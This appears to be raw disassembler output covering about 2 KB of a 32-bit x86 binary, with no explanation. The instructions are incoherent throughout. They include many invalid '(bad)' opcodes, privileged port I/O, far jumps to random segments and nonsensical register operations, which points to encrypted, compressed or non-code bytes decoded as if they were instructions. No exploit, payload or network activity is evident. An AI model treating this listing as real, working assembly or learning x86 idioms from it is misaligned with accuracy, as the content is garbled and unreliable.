  406cfa:	add    esi,DWORD PTR [eax+0x7a9b00f1]
  406d00:	out    0x5e,al
  406d02:	(bad)  
  406d03:	std    
  406d04:	(bad)  
  406d05:	pop    ecx
  406d06:	cs pop edi
  406d08:	aas    
  406d09:	sar    DWORD PTR [ecx+0x18123f78],1
  406d0f:	mov    ch,dl
  406d11:	mov    fs,ebp
  406d13:	clc    
  406d14:	mov    dh,0x34
  406d16:	out    dx,eax
  406d17:	loop   0x406d93
  406d19:	xchg   BYTE PTR [eax+0x22],dl
  406d1c:	je     0x406d4e
  406d1e:	jge    0x406cbc
  406d20:	inc    esi
  406d21:	bound  eax,QWORD PTR [ebx]
  406d23:	adc    ah,cl
  406d25:	xchg   ebx,eax
  406d26:	cld    
  406d27:	xchg   DWORD PTR [ebp-0x7f],esp
  406d2a:	push   edi
  406d2b:	lds    edx,FWORD PTR ds:0x64ae3dee
  406d31:	cli    
  406d32:	pop    ebp
  406d33:	jo     0x406d0a
  406d35:	adc    bh,ah
  406d37:	push   es
  406d38:	add    al,0xa6
  406d3a:	je     0x406d57
  406d3c:	mov    al,ds:0x77189825
  406d41:	jmp    0xfb55:0xca518112
  406d48:	mov    dl,0xa
  406d4a:	or     edi,ebp
  406d4c:	push   es
  406d4d:	inc    edx
  406d4e:	push   cs
  406d4f:	call   0x317e:0x674cac8f
  406d56:	mov    BYTE PTR [ebp-0x71],ah
  406d59:	in     al,dx
  406d5a:	and    eax,edi
  406d5c:	fs add al,0x3d
  406d5f:	es sbb al,0xd7
  406d62:	or     DWORD PTR [ecx+ecx*1-0x20],edx
  406d66:	pop    ss
  406d67:	dec    ecx
  406d68:	push   es
  406d69:	rcr    DWORD PTR [eax+0x36a68dd6],cl
  406d6f:	and    al,0x89
  406d71:	shr    DWORD PTR [ecx-0x76],0xc6
  406d75:	jmp    0x406dbc
  406d77:	enter  0x6347,0x16
  406d7b:	jmp    0x3b7c:0xc0b6c438
  406d82:	pusha  
  406d83:	mov    al,dh
  406d85:	pusha  
  406d86:	xor    ebx,ebx
  406d88:	and    edi,DWORD PTR [ebx]
  406d8a:	loope  0x406de1
  406d8c:	or     DWORD PTR [eax-0x196e583e],0xfffffffb
  406d93:	retf   0xf9d
  406d96:	ins    DWORD PTR es:[edi],dx
  406d97:	clc    
  406d98:	xchg   esp,eax
  406d99:	lods   al,BYTE PTR ds:[esi]
  406d9a:	or     DWORD PTR ds:[esi+0x9412580],ebp
  406da1:	mov    dh,0xad
  406da3:	and    DWORD PTR [ebp+0x23],ebx
  406da6:	mov    ah,0x3d
  406da8:	aam    0x13
  406daa:	jl     0x406d4f
  406dac:	lea    edx,[edx+0x10]
  406daf:	aam    0x5a
  406db1:	pop    esi
  406db2:	xchg   eax,ebx
  406db4:	leave  
  406db5:	add    DWORD PTR [esi-0x3d],edi
  406db8:	mov    ds:0xacbb0876,al
  406dbd:	adc    esi,DWORD PTR [edx-0x4d63aefb]
  406dc3:	les    edx,FWORD PTR [eax+0x1134e68c]
  406dc9:	repnz loop 0x406e02
  406dcc:	sbb    ebx,DWORD PTR [eax-0x450193f2]
  406dd2:	fist   DWORD PTR [ecx+ecx*4]
  406dd5:	addr16 ret 0xc1b8
  406dd9:	lock jns 0x406ddb
  406ddc:	sbb    BYTE PTR [edi],ch
  406dde:	jb     0x406e5b
  406de0:	sub    bl,BYTE PTR [ebp+0x65]
  406de3:	repz je 0x406dbb
  406de6:	push   es
  406de7:	jle    0x406dd3
  406de9:	adc    edi,DWORD PTR [edx-0xcc56c0]
  406def:	fdivr  st,st(1)
  406df1:	retf   0x9fbd
  406df4:	dec    eax
  406df5:	jl     0x406df9
  406df7:	push   ss
  406df8:	and    DWORD PTR [ebx+0x72],0x153c729e
  406dff:	(bad)  
  406e00:	or     BYTE PTR [ebp-0x3f996ea0],bh
  406e06:	in     eax,dx
  406e07:	jecxz  0x406d92
  406e09:	sub    BYTE PTR [ebp-0x24],dl
  406e0c:	fucomp st(0)
  406e0e:	adc    ebx,DWORD PTR [eax]
  406e10:	gs jno 0x406dbe
  406e13:	jmp    0xe18460af
  406e18:	jecxz  0x406e42
  406e1a:	addr16 loop 0x406e1b
  406e1d:	out    0xc,eax
  406e1f:	pop    edx
  406e20:	idiv   ah
  406e22:	(bad)  
  406e23:	in     al,dx
  406e24:	push   ebx
  406e25:	loopne 0x406ea5
  406e27:	addr16 inc ebx
  406e29:	push   esi
  406e2a:	fwait
  406e2b:	pop    ds
  406e2c:	cld    
  406e2d:	add    dl,BYTE PTR [ecx+0x28caed65]
  406e33:	sbb    DWORD PTR [edx],esp
  406e35:	sar    eax,1
  406e37:	sub    eax,0x97539dfd
  406e3c:	mov    edx,0xe3a40478
  406e41:	imul   BYTE PTR [ecx-0x3f]
  406e44:	cmp    DWORD PTR [ecx-0x67fd725f],edx
  406e4a:	cmp    al,bl
  406e4c:	push   cs
  406e4d:	push   esp
  406e4e:	inc    ecx
  406e4f:	pop    esi
  406e50:	mov    ah,0xeb
  406e52:	mov    ebx,0xcbba5729
  406e57:	das    
  406e58:	dec    BYTE PTR [ebp+0x263413f4]
  406e5e:	jle    0x406e7f
  406e60:	and    dl,BYTE PTR [edi+edi*8-0x61]
  406e64:	adc    ecx,DWORD PTR [eax-0x47]
  406e67:	(bad)  
  406e68:	xchg   edx,eax
  406e69:	sbb    BYTE PTR [edi+0x68],dh
  406e6c:	adc    BYTE PTR [ebx],0x14
  406e6f:	cmp    bh,BYTE PTR [ebx-0x57]
  406e72:	in     eax,0xdb
  406e74:	pushf  
  406e75:	outs   dx,DWORD PTR ds:[esi]
  406e76:	or     eax,0xc5714af0
  406e7b:	loopne 0x406e24
  406e7d:	outs   dx,DWORD PTR ds:[esi]
  406e7e:	push   ecx
  406e7f:	fld    QWORD PTR [esi-0x5f]
  406e82:	mov    ecx,0x6fef5dbf
  406e87:	mov    bl,0x4c
  406e89:	push   esi
  406e8a:	scas   al,BYTE PTR es:[edi]
  406e8b:	retf   0xf309
  406e8e:	ja     0x406e6c
  406e90:	fmul   QWORD PTR [ecx]
  406e92:	jl     0x406f05
  406e94:	xchg   edx,eax
  406e95:	lahf   
  406e96:	mov    DWORD PTR [ebx],edi
  406e98:	in     eax,0x40
  406e9a:	retf   0x1b3b
  406e9d:	add    al,0x79
  406e9f:	mov    esi,0x1cf98567
  406ea4:	push   edi
  406ea5:	mov    bh,0xd0
  406ea7:	cmp    edx,0x4b6b3a7d
  406ead:	arpl   WORD PTR [ebx+0x128d5bdd],di
  406eb3:	xor    dh,BYTE PTR [ebp+0x5bec54b9]
  406eb9:	popf   
  406eba:	pop    ebp
  406ebb:	mov    BYTE PTR [esi],dh
  406ebd:	push   ebp
  406ebe:	inc    edx
  406ebf:	es xchg ecx,eax
  406ec1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406ec2:	jmp    0xc7a7:0x13b757d8
  406ec9:	repnz push ecx
  406ecb:	push   0xffffffc5
  406ecd:	popf   
  406ece:	loop   0x406eca
  406ed0:	sbb    BYTE PTR [esp+esi*2+0x2ff83617],bl
  406ed7:	xor    DWORD PTR [ecx],edx
  406ed9:	mov    BYTE PTR [ebx+eiz*4+0x1cda850d],bh
  406ee0:	nop
  406ee1:	stc    
  406ee2:	test   eax,0xe1c3a4f1
  406ee7:	stos   BYTE PTR es:[edi],al
  406ee8:	xlat   BYTE PTR ds:[ebx]
  406ee9:	idiv   DWORD PTR [ebx+0x7f2ac3f4]
  406eef:	push   ds
  406ef0:	dec    edi
  406ef1:	popa   
  406ef2:	mov    al,ds:0xb33aa791
  406ef7:	xchg   esi,eax
  406ef8:	sbb    esp,esi
  406efa:	div    DWORD PTR ss:[ecx]
  406efd:	xchg   esi,eax
  406efe:	inc    ebx
  406eff:	cmp    DWORD PTR [edx-0x38],0x35b2a3fb
  406f06:	jae    0x406ef6
  406f08:	dec    edx
  406f09:	in     eax,dx
  406f0a:	mov    ds:0xeb5518bc,al
  406f0f:	into   
  406f10:	clc    
  406f11:	dec    ebx
  406f12:	push   esp
  406f13:	leave  
  406f14:	nop
  406f15:	jae    0x406f05
  406f17:	cmc    
  406f18:	add    ebx,DWORD PTR ds:0x202eb8a1
  406f1e:	push   es
  406f1f:	pop    esp
  406f20:	adc    ecx,DWORD PTR [esi]
  406f22:	in     al,dx
  406f23:	pop    edi
  406f24:	inc    edx
  406f25:	nop
  406f26:	ret    
  406f27:	or     edx,DWORD PTR [esp+ebx*8-0x14adcb4]
  406f2e:	ss mov ebp,0xcd15d302
  406f34:	mov    ds:0x6f868710,eax
  406f39:	enter  0x98b6,0xcb
  406f3d:	adc    DWORD PTR [ecx+0x204ed14d],ebp
  406f43:	jmp    0x8061c31c
  406f48:	in     al,0x1e
  406f4a:	jle    0x406ece
  406f4c:	mov    ebx,0xc13659f6
  406f51:	rcr    BYTE PTR [esi+0x55],cl
  406f54:	dec    di
  406f56:	pop    fs
  406f58:	pop    DWORD PTR [edi-0xcb4ea8e]
  406f5e:	push   ss
  406f5f:	popa   
  406f60:	pop    esi
  406f61:	push   edi
  406f62:	ret    
  406f63:	mov    dl,0xbe
  406f65:	and    eax,0x905d5aad
  406f6a:	or     ch,ah
  406f6c:	popf   
  406f6d:	sbb    dh,BYTE PTR [eax]
  406f6f:	inc    eax
  406f70:	jl     0x406fc3
  406f72:	jl     0x406f5d
  406f74:	sbb    bl,BYTE PTR [eax-0x69ddfe7c]
  406f7a:	shr    DWORD PTR [edx],0xfe
  406f7d:	retf   
  406f7e:	sub    eax,0x8bd4ff95
  406f83:	(bad)  
  406f84:	scas   al,BYTE PTR es:[edi]
  406f85:	xchg   cl,dl
  406f87:	and    eax,0xaffe8438
  406f8c:	(bad)  
  406f8d:	xor    esi,ebx
  406f8f:	push   edi
  406f90:	pop    ecx
  406f91:	adc    ch,ah
  406f93:	and    ecx,DWORD PTR [ecx]
  406f95:	je     0x406fca
  406f97:	call   0xc2a64146
  406f9c:	inc    ecx
  406f9d:	jmp    0x3b71:0xb7c81acc
  406fa4:	(bad)  
  406fa5:	lahf   
  406fa6:	ror    BYTE PTR [eax+0x46a5194],1
  406fac:	dec    edi
  406fad:	jecxz  0x406fa0
  406faf:	sub    DWORD PTR [esi+0x7b],0x35bed8e8
  406fb6:	lock cld 
  406fb8:	fisub  WORD PTR [eax]
  406fba:	enter  0x430e,0xb9
  406fbe:	fld    QWORD PTR [ecx+0x4fe680d9]
  406fc4:	dec    eax
  406fc5:	mul    BYTE PTR [esi+0xcc30d70]
  406fcb:	je     0x406fa1
  406fcd:	pop    ss
  406fce:	pop    edx
  406fcf:	sbb    eax,0x48dc8918
  406fd4:	inc    edx
  406fd5:	push   cs
  406fd6:	mov    bl,0x52
  406fd8:	in     al,dx
  406fd9:	fistp  QWORD PTR [esi]
  406fdb:	and    bh,bl
  406fdd:	mov    WORD PTR [esi-0x37],?
  406fe0:	mov    ch,0xfd
  406fe2:	or     BYTE PTR [edi],dh
  406fe4:	popa   
  406fe5:	int    0x62
  406fe7:	cmp    DWORD PTR [ebx+0xc343475],edi
  406fed:	xor    ebx,DWORD PTR [ebx+0x68c6a8d]
  406ff3:	adc    ecx,DWORD PTR [ebp-0x21]
  406ff6:	jle    0x406fc7
  406ff8:	cmp    BYTE PTR [esp+ecx*8-0x40179765],bh
  406fff:	cdq    
  407000:	pop    ebp
  407001:	pop    eax
  407002:	cmc    
  407003:	int3   
  407004:	rcr    DWORD PTR [edx],1
  407006:	and    BYTE PTR [esi],dl
  407008:	push   eax
  407009:	jg     0x407063
  40700b:	push   ebx
  40700c:	scas   al,BYTE PTR es:[edi]
  40700d:	fcom   QWORD PTR [edi-0x9e8405c]
  407013:	fsubr  QWORD PTR [ebp+ecx*1+0x60]
  407017:	ret    
  407018:	das    
  407019:	mov    BYTE PTR [eax+0x17],bl
  40701c:	retf   0x5a1a
  40701f:	repz pop edx
  407021:	fld    DWORD PTR [ebp-0x3cad86bf]
  407027:	sbb    al,0x81
  407029:	hlt    
  40702a:	jne    0x40704a
  40702c:	div    DWORD PTR [edi+0x7052b28e]
  407032:	jo     0x407019
  407034:	ret    
  407035:	pop    es
  407036:	outs   dx,DWORD PTR ds:[esi]
  407037:	sbb    esi,0xb0cd77f0
  40703d:	mov    bl,0x6b
  40703f:	cli    
  407040:	jns    0x406ff6
  407042:	int3   
  407043:	addr16 push ebx
  407045:	int    0x1a
  407047:	div    DWORD PTR [edx+0x37]
  40704a:	pop    es
  40704b:	inc    ebx
  40704c:	jmp    0x4070af
  40704e:	shr    ah,cl
  407050:	jo     0x40706c
  407052:	inc    edi
  407053:	and    al,0x3e
  407055:	fdiv   DWORD PTR [ebp+edx*2+0x4b]
  407059:	call   DWORD PTR [eax+eiz*1+0x52]
  40705d:	xchg   esi,eax
  40705e:	pop    edi
  40705f:	aas    
  407060:	test   DWORD PTR [esi+0xa225ccd],esp
  407066:	lahf   
  407067:	jns    0x40700c
  407069:	add    ch,BYTE PTR [ebp-0x3d]
  40706c:	xchg   esp,eax
  40706d:	adc    al,0x89
  40706f:	out    dx,eax
  407070:	dec    edi
  407071:	mov    cl,0x1a
  407073:	mov    eax,0x245e091f
  407078:	lahf   
  407079:	in     al,dx
  40707a:	jae    0x4070e5
  40707c:	add    eax,0xb2724912
  407081:	lods   al,BYTE PTR ds:[esi]
  407082:	push   edx
  407083:	out    0x53,al
  407085:	in     al,0x29
  407087:	pop    ds
  407088:	ficomp WORD PTR ds:0x63b1163b
  40708e:	jp     0x4070b8
  407090:	push   edx
  407091:	in     eax,0xc3
  407093:	mov    bl,0xe3
  407095:	xchg   edi,eax
  407096:	test   al,0x8d
  407098:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407099:	mov    BYTE PTR [edi-0x4915eac2],cl
  40709f:	mov    ah,0x1d
  4070a1:	add    ebp,0xfffffff3
  4070a4:	sbb    BYTE PTR [edx],ah
  4070a6:	retf   
  4070a7:	push   ds
  4070a8:	int3   
  4070a9:	inc    edx
  4070aa:	push   edx
  4070ab:	sub    BYTE PTR [edi+0x33],dl
  4070ae:	push   ecx
  4070af:	mov    bl,0x10
  4070b1:	cld    
  4070b2:	lea    ecx,[edx]
  4070b4:	mov    bl,0xdf
  4070b6:	push   edx
  4070b7:	sti    
  4070b8:	mov    al,ch
  4070ba:	inc    edx
  4070bb:	add    dh,BYTE PTR [ebx]
  4070bd:	mov    edi,0x9bf6cb53
  4070c2:	push   ecx
  4070c3:	vorpd  ymm3,ymm3,YMMWORD PTR [edx-0x5a]
  4070c8:	adc    al,0x78
  4070ca:	repnz scas al,BYTE PTR es:[edi]
  4070cc:	outs   dx,DWORD PTR ds:[esi]
  4070cd:	adc    DWORD PTR [edi+0x21b67bae],0x46
  4070d4:	jmp    0x662a:0xe588160c
  4070db:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4070dc:	jmp    0x9b338fa3
  4070e1:	cmp    ah,BYTE PTR [ecx+0x789e58de]
  4070e7:	sbb    eax,0xe2418f88
  4070ec:	inc    esi
  4070ed:	or     ebp,eax
  4070ef:	sahf   
  4070f0:	push   ss
  4070f1:	arpl   WORD PTR [eax-0x10],cx
  4070f4:	fidivr WORD PTR [ebx]
  4070f6:	js     0x4070ff
  4070f8:	inc    esi
  4070f9:	push   esi
  4070fa:	push   ss
  4070fb:	jno    0x40716d
  4070fd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4070fe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4070ff:	or     eax,0xf95bbf01
  407104:	out    0xe9,eax
  407106:	out    dx,al
  407107:	ss loope 0x407160
  40710a:	push   0x6d141b1c
  40710f:	out    dx,eax
  407110:	sbb    BYTE PTR [edi+esi*2],dh
  407113:	xchg   ebp,eax
  407114:	pop    edx
  407115:	push   ds
  407116:	mov    eax,ds:0x354d2455
  40711b:	xchg   esp,eax
  40711c:	rol    BYTE PTR [ecx+0x42],0xf5
  407120:	cmp    edi,esp
  407122:	mov    esi,0x854b0e1
  407127:	dec    esp
  407128:	cmp    edx,DWORD PTR [ebx-0xa]
  40712b:	cli    
  40712c:	xor    BYTE PTR [esp+edi*8-0x1623dfea],dl
  407133:	(bad)  [ebx+0x1f9445fb]
  407139:	dec    ebp
  40713a:	in     eax,0x97
  40713c:	jne    0x4070c9
  40713e:	mov    eax,DWORD PTR [ebx]
  407140:	repz push ecx
  407142:	lds    edx,FWORD PTR [edx]
  407144:	mov    ch,0x17
  407146:	adc    esp,0xd31db9f6
  40714c:	mov    bl,0x55
  40714e:	jp     0x4071c4
  407150:	sbb    dl,BYTE PTR [ebp-0x62]
  407153:	xor    dh,dh
  407155:	into   
  407156:	out    0xa8,al
  407158:	jbe    0x4071c3
  40715a:	fdiv   st,st(7)
  40715c:	dec    ebx
  40715d:	and    eax,0x2a1d863d
  407162:	mov    bh,0x92
  407164:	dec    ebp
  407165:	dec    ebp
  407166:	js     0x40716c
  407168:	xchg   ebp,eax
  407169:	or     DWORD PTR [edi-0x5488e4e5],ecx
  40716f:	bndstx [ebp-0x4e3cde8f],(bad)
  407176:	sub    eax,0x5fe36373
  40717b:	rcr    BYTE PTR [edi],cl
  40717d:	shr    DWORD PTR [edi-0x28f4de47],cl
  407183:	pushf  
  407184:	cmp    al,0xe0
  407186:	sbb    al,0xc3
  407188:	dec    esi
  407189:	or     edi,ecx
  40718b:	jae    0x40711a
  40718d:	push   ecx
  40718e:	nop
  40718f:	repnz test BYTE PTR [ebp-0x5fdb215e],cl
  407196:	cmp    al,0xe1
  407198:	jmp    0xeb32cf41
  40719d:	xor    DWORD PTR [esi+0x5e],edi
  4071a0:	test   DWORD PTR ds:0x7ca0e9e2,0x96687eaf
  4071aa:	std    
  4071ab:	das    
  4071ac:	pop    ebx
  4071ad:	mov    al,0x3a
  4071af:	push   ebp
  4071b0:	cwde   
  4071b1:	pop    edx
  4071b2:	loope  0x4071bd
  4071b4:	iret   
  4071b5:	dec    esp
  4071b6:	jns    0x4071ba
  4071b8:	aam    0x2b
  4071ba:	pop    ebp
  4071bb:	cdq    
  4071bc:	in     eax,dx
  4071bd:	xor    bl,BYTE PTR [ecx-0x72]
  4071c0:	sbb    DWORD PTR [edi-0x3c],edx
  4071c3:	sub    BYTE PTR [esi],cl
  4071c5:	fwait
  4071c6:	gs pop eax
  4071c8:	lahf   
  4071c9:	xor    esp,DWORD PTR [ebx-0x21]
  4071cc:	mov    ah,0xad
  4071ce:	int3   
  4071cf:	xchg   DWORD PTR [edi+0x45be3ea],ebp
  4071d5:	add    dl,BYTE PTR [ecx]
  4071d7:	aad    0xb5
  4071d9:	inc    esi
  4071da:	enter  0xce03,0x1b
  4071de:	iret   
  4071df:	add    BYTE PTR [eax+ebx*4+0x30],al
  4071e3:	mov    WORD PTR [edx-0x482b0358],fs
  4071e9:	loope  0x407245
  4071eb:	pop    ebx
  4071ec:	or     edx,0xc5c369f1
  4071f2:	xor    al,0x78
  4071f4:	jmp    0x4071a4
  4071f6:	dec    edx
  4071f7:	ss add eax,0x7ab31e81
  4071fd:	out    dx,eax
  4071fe:	and    DWORD PTR ds:0xc811f101,edi
  407204:	mov    ecx,0xbc808fef
  407209:	lea    esp,[eax]
  40720b:	or     ch,0x52
  40720e:	cmp    BYTE PTR [edi-0xb],dh
  407211:	mov    WORD PTR [eax-0x4a42865b],fs
  407217:	xchg   ebp,eax
  407218:	enter  0x634b,0x8b
  40721c:	aad    0x64
  40721e:	and    cl,BYTE PTR ds:0xbaa07edf
  407224:	adc    eax,0x47d425c2
  407229:	(bad)
  40722c:	jno    0x407272
  40722e:	loop   0x4072a4
  407230:	sbb    bh,BYTE PTR [esi+eax*2]
  407233:	inc    BYTE PTR [edx]
  407235:	cmp    al,dl
  407237:	js     0x4071e0
  407239:	sub    al,0x23
  40723b:	ds jl  0x40722c
  40723e:	inc    eax
  40723f:	and    eax,0x81ef84f9
  407244:	inc    edx
  407245:	lahf   
  407246:	sbb    esp,DWORD PTR [eax+0x3c74d6bf]
  40724c:	inc    ebx
  40724d:	push   ecx
  40724e:	test   eax,0xd529d14f
  407253:	cmp    ah,ch
  407255:	xor    ch,BYTE PTR [esi]
  407257:	pop    ebp
  407258:	mov    ebx,0x892bd36e
  40725d:	inc    ebx
  40725e:	cwde   
  40725f:	jne    0x407259
  407261:	mov    bh,0x6
  407263:	in     eax,dx
  407264:	sub    bl,BYTE PTR [eax]
  407266:	inc    edx
  407267:	pop    ebp
  407268:	mov    bl,0xbf
  40726a:	xchg   ebx,eax
  40726b:	pop    eax
  40726c:	cmp    DWORD PTR [eax-0x67],esp
  40726f:	lahf   
  407270:	cmp    DWORD PTR [ecx+edx*8+0x50f50cfd],0xffffffb2
  407278:	mov    ds:0xfabc3d6c,eax
  40727d:	jbe    0x407297
  40727f:	jae    0x407267
  407281:	mov    esp,edi
  407283:	xchg   edx,eax
  407284:	loop   0x407234
  407286:	sub    ah,BYTE PTR es:[edx]
  407289:	aad    0xc7
  40728b:	mov    ?,WORD PTR [ecx]
  40728d:	mov    dh,0xd4
  40728f:	jae    0x4072c4
  407291:	push   edx
  407292:	jnp    0x40726c
  407294:	shl    DWORD PTR [ecx],cl
  407296:	and    DWORD PTR [eax],esp
  407298:	xor    esp,eax
  40729a:	ins    BYTE PTR es:[edi],dx
  40729b:	clc    
  40729c:	data16 test al,0x3
  40729f:	jmp    0x40722a
  4072a1:	push   esp
  4072a2:	mov    edx,0xb5082e7e
  4072a7:	mov    al,ds:0x671fb518
  4072ac:	add    al,0x3e
  4072ae:	les    edi,FWORD PTR [esi-0x80]
  4072b1:	sar    ah,0x34
  4072b4:	fistp  DWORD PTR [edi+eiz*1-0x4bb57ee4]
  4072bb:	fwait
  4072bc:	test   DWORD PTR [ecx],esp
  4072be:	mov    ch,0xf2
  4072c0:	dec    ecx
  4072c1:	stc    
  4072c2:	mov    dl,0x97
  4072c4:	out    dx,al
  4072c5:	gs sbb edi,edi
  4072c8:	push   ebp
  4072c9:	mov    ch,0xbc
  4072cb:	pusha  
  4072cc:	push   ss
  4072cd:	retf   0xdf01
  4072d0:	pop    ebx
  4072d1:	pop    ss
  4072d2:	je     0x407324
  4072d4:	in     eax,dx
  4072d5:	sti    
  4072d6:	push   es
  4072d7:	cmp    DWORD PTR [edi],esp
  4072d9:	aad    0x8e
  4072db:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4072dc:	adc    al,0x5
  4072de:	pop    edi
  4072df:	ds jno 0x4072ad
  4072e2:	fidivr WORD PTR [ebx]
  4072e4:	sahf   
  4072e5:	and    BYTE PTR [edi-0x6c8c96b5],bl
  4072eb:	lds    esp,FWORD PTR [edi]
  4072ed:	push   ebp
  4072ee:	mov    ebp,esp
  4072f0:	sub    al,0xc9
  4072f2:	lea    ebp,[edx+0x1d]
  4072f5:	pop    ds
  4072f6:	in     eax,0xb4
  4072f8:	ins    BYTE PTR es:[edi],dx
  4072f9:	push   esp
  4072fa:	mov    edx,es
  4072fc:	addr16 inc ebp
  4072fe:	out    0x66,eax
  407300:	jge    0x407361
  407302:	mov    ch,0x82
  407304:	and    al,0xf8
  407306:	cldemote BYTE PTR [eax+0x6e]
  40730a:	and    ebp,DWORD PTR [eax-0x6287e40b]
  407310:	jecxz  0x4072af
  407312:	push   0x5b
  407314:	call   0x851b:0x934a43e0
  40731b:	push   0xffffff87
  40731d:	cmp    eax,0x97fd4ae6
  407322:	pop    es
  407323:	mov    ch,0x38
  407325:	push   ebx
  407326:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407327:	jnp    0x407343
  407329:	jmp    0xc0e6:0x8286b8e
  407330:	lea    eax,[edi+0x1c]
  407333:	adc    al,0xcb
  407335:	repnz test BYTE PTR [edi-0x23],dh
  407339:	(bad)  
  40733a:	xor    esp,DWORD PTR [edi]
  40733c:	aaa    
  40733d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40733e:	pop    ss
  40733f:	outs   dx,BYTE PTR ds:[esi]
  407340:	std    
  407341:	jb     0x40731a
  407343:	push   ds
  407344:	mov    eax,ds:0xff7920c1
  407349:	add    eax,0x72d87e65
  40734e:	jp     0x4072d1
  407350:	(bad)
  407353:	nop
  407354:	fcomp  st(2)
  407356:	jl     0x40737f
  407358:	jno    0x4072fd
  40735a:	inc    edx
  40735b:	jae    0x4072fa
  40735d:	sbb    ebx,DWORD PTR [edi+0x461a9807]
  407363:	les    edi,FWORD PTR [eax]
  407365:	dec    edx
  407366:	jge    0x407327
  407368:	aas    
  407369:	fidivr WORD PTR [edx]
  40736b:	inc    BYTE PTR [ecx+0x40]
  40736e:	nop
  40736f:	in     eax,0xb9
  407371:	jg     0x407343
  407373:	sub    cl,BYTE PTR [edi]
  407375:	jmp    0x35695dca
  40737a:	mov    ah,0x3c
  40737c:	shl    dh,0xbc
  40737f:	mov    edi,0x5502cd0f
  407384:	sbb    DWORD PTR [ebx+0x1d94d354],ebp
  40738a:	dec    ebp
  40738b:	call   0xeed8f1b8
  407390:	loop   0x4073f6
  407392:	mov    al,0xfb
  407394:	pop    edi
  407395:	add    BYTE PTR [ebx+ebp*1+0x16520de5],dl
  40739c:	jmp    0x40733d
  40739e:	sub    bl,ah
  4073a0:	shl    BYTE PTR [edx-0x6d],1
  4073a3:	add    eax,0x2befd417
  4073a8:	leave  
  4073a9:	or     ah,ch
  4073ab:	xor    BYTE PTR [edi],ch
  4073ad:	cwde   
  4073ae:	aaa    
  4073af:	dec    ebx
  4073b0:	out    dx,al
  4073b1:	or     eax,0xec8bd57a
  4073b6:	mov    edx,0x85900be3
  4073bb:	xor    eax,0xbf57021
  4073c0:	inc    ecx
  4073c1:	fidivr DWORD PTR [esp+edx*1+0x3d3fa33b]
  4073c8:	or     BYTE PTR [edi-0x4f04507d],ah
  4073ce:	xor    esi,DWORD PTR [eax-0x7f9c3b80]
  4073d4:	mov    bl,0x89
  4073d6:	and    DWORD PTR [edx-0x15],ecx
  4073d9:	ins    DWORD PTR es:[edi],dx
  4073da:	imul   esp,esp,0xffffffd7
  4073dd:	xchg   edx,eax
  4073de:	adc    BYTE PTR [edx-0xfdbb8c5],0x92
  4073e5:	push   es
  4073e6:	or     BYTE PTR [esi+0x5655439f],0x57
  4073ed:	jl     0x407432
  4073ef:	inc    esi
  4073f0:	outs   dx,BYTE PTR ds:[esi]
  4073f1:	mov    ds:0xd1fdd6c5,al
  4073f6:	xor    ecx,DWORD PTR [esi-0x75]
  4073f9:	sbb    ah,BYTE PTR ds:0x170565d1
  4073ff:	pop    ebp
  407400:	icebp  
  407401:	mov    edx,0xc096ca5b
  407406:	mov    eax,ds:0xff1b71b2
  40740b:	imul   edx,DWORD PTR [ecx+0x27],0x4fcf57b9
  407412:	sar    BYTE PTR [ebp+0x30485ecb],cl
  407418:	mov    ds:0x34938865,eax
  40741d:	push   es
  40741e:	xchg   BYTE PTR [ecx],dl
  407420:	ret    0x3f10
  407423:	or     BYTE PTR [ebx+0x49],0x97
  407427:	scas   al,BYTE PTR es:[edi]
  407428:	daa    
  407429:	int    0x65
  40742b:	mov    edx,0xa8bd38b0
  407430:	xor    eax,0x1976de50
  407435:	test   DWORD PTR [ecx],edi
  407437:	sub    DWORD PTR [ebx+0x18dd709d],ecx
  40743d:	pop    es
  40743e:	out    dx,eax
  40743f:	mov    edx,0xaf110edb
  407444:	fdivr  DWORD PTR [ebp-0x1a77eda]
  40744a:	imul   edx,ebp,0xcc736424
  407450:	mov    DWORD PTR [edi+esi*1+0x7],ebx
  407454:	cmc    
  407455:	test   eax,0x43981f46
  40745a:	jno    0x40746d
  40745c:	das    
  40745d:	lea    edx,fs:[eax+eax*1]
  407461:	scas   eax,DWORD PTR es:[edi]
  407462:	enter  0x8749,0xe5
  407466:	mov    edx,fs
  407468:	mov    cl,0xce
  40746a:	arpl   cx,bp
  40746c:	dec    ebx
  40746d:	in     eax,0xc3
  40746f:	sbb    eax,DWORD PTR [ecx+esi*8]
  407472:	popa   
  407473:	icebp  
  407474:	dec    eax
  407475:	loop   0x407430
  407477:	aam    0x32
  407479:	leave  
  40747a:	fxch   st(0)
  40747c:	je     0x407472
  40747e:	jmp    0x407424
  407480:	jne    0x4074b7
  407482:	enter  0xabbe,0x85
  407486:	or     dl,bl
  407488:	retf   
  407489:	sbb    DWORD PTR [ecx],ebx
  40748b:	(bad)  
  40748c:	cmp    BYTE PTR [ebp+eiz*1+0x19],ch
  407490:	adc    dl,BYTE PTR [ecx-0x7d770d2b]
  407496:	xchg   esp,eax
  407497:	xor    eax,0x6cfdd26e
  40749c:	jno    0x40745c
  40749e:	inc    esp
  40749f:	cmp    BYTE PTR [eax],ah
  4074a1:	cmp    ch,dh
  4074a3:	mov    ch,0x60
  4074a5:	dec    esi
  4074a6:	loopne 0x407500
  4074a8:	shl    DWORD PTR [edi+0x16],1
  4074ab:	jle    0x407462
  4074ad:	push   0x37
  4074af:	out    dx,eax
  4074b0:	pushf  
  4074b1:	sahf   
  4074b2:	sub    ebx,DWORD PTR [eax+0x8]
  4074b5:	jbe    0x4074bd
  4074b7:	inc    ecx
  4074b8:	dec    ebp
  4074b9:	push   esi
  4074bb:	push   ds
  4074bc:	push   ebx
  4074bd:	cmc    
  4074be:	cmp    al,0x7a
  4074c0:	fucomip st,st(0)
  4074c2:	adc    dh,BYTE PTR [eax]
  4074c4:	mov    eax,0x65f4249f
  4074c9:	jnp    0x4074e2
  4074cb:	(bad)  
  4074cc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4074cd:	mov    esp,0x4e7d06bd
  4074d2:	jmp    0xa6e1:0x7cfc7a70
  4074d9:	stc    
  4074da:	sbb    DWORD PTR [edx-0x5ad1a170],0xffffff8f
  4074e1:	jmp    0x4074c9
  4074e3:	js     0x407553
